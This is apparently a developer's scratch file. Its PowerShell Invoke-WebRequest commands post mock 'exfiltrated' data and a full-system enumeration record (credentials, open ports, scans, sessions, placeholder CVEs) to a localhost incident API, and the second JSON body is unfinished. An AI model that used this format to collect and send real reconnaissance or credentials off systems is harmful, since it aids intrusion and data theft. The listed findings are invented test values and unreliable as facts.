Invoke-WebRequest -Uri "http://localhost:5000/api/incidents/a5a71402289c15a10c3e764f4fb8e073019d391b7c8a3fdd8d01c72f266136ca" -Method Post -Headers @{ "Content-Type" = "application/json" } -Body '{"data": "sample_exfiltrated_data", "additional_info": "some_other_info"}'


bu bir

bu iki


Invoke-WebRequest -Uri "http://localhost:5000/api/incidents/a5a71402289c15a10c3e764f4fb8e073019d391b7c8a3fdd8d01c72f266136ca" -Method Post -Headers @{ "Content-Type" = "application/json" } -Body '{
"data": {
"enumeration_type": "full_system_enumeration",
"usernames": ["admin", "root", "guest", "testuser", "superadmin", "administrator"],
"passwords_found": ["password123", "123456", "qwerty", "toor", "letmein", "1234"],
"network_info": {
"open_ports": [22, 80, 443, 3306, 8080],
"service_versions": {
"SSH": "OpenSSH 7.2p2 Ubuntu 4ubuntu2.8",
"HTTP": "Apache/2.4.18 (Ubuntu)",
"FTP": "vsftpd 3.0.3",
"MySQL": "5.7.31",
"Tomcat": "Apache Tomcat/9.0.40"
},
"network_addresses": ["192.168.1.1", "192.168.1.2", "192.168.1.100", "10.0.0.1", "172.16.0.2"],
"active_services": ["SSH", "HTTP", "FTP", "MySQL", "DNS"],
"subnet_scan_results": {
"192.168.1.0/24": {
"hosts_alive": 20,
"hosts_down": 5,
"hosts_unreachable": 2
},
"10.0.0.0/24": {
"hosts_alive": 15,
"hosts_down": 3,
"hosts_unreachable": 4
}
}
},
"os_info": {
"hostname": "server1.local",
"os_version": "Ubuntu 18.04.4 LTS",
"architecture": "x86_64",
"kernel_version": "5.4.0-66-generic",
"uptime": "120 hours",
"disk_space": {
"total": "500GB",
"used": "300GB",
"free": "200GB"
},
"cpu_info": {
"model": "Intel Xeon",
"cores": 8,
"cpu_speed": "3.4GHz",
"architecture": "x86_64"
},
"memory_info": {
"total_memory": "32GB",
"used_memory": "18GB",
"free_memory": "14GB"
}
},
"vulnerabilities": ["CVE-2019-12345", "CVE-2020-23456", "CVE-2018-12345", "CVE-2021-23412"],
"active_sessions": [
{
"session_id": "session12345",
"user": "root",
"ip": "192.168.1.2",
"login_time": "2025-05-10T13:45:00Z",
"session_duration": "5 hours"
},
{
"session_id": "session67890",
"user": "admin",
"ip": "192.168.1.3",
"login_time": "2025-05-10T14:00:00Z",
"session_duration": "3 hours"
}
],
"installed_software": ["Apache", "MySQL", "Nginx", "PostgreSQL", "Tomcat", "Docker", "Vagrant"],
"logs": [
{


### asd
# aa



